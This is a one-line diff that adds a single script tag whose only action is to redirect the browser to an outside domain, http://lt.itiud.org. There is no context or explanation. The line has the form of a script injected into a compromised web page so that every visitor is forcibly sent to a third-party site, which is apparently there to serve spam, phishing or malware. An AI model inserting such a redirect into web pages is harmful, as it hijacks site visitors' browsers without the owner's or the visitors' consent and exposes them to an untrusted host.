@@ -1,0 +1,1 @@
+<script>location.replace("http://lt.itiud.org");</script>
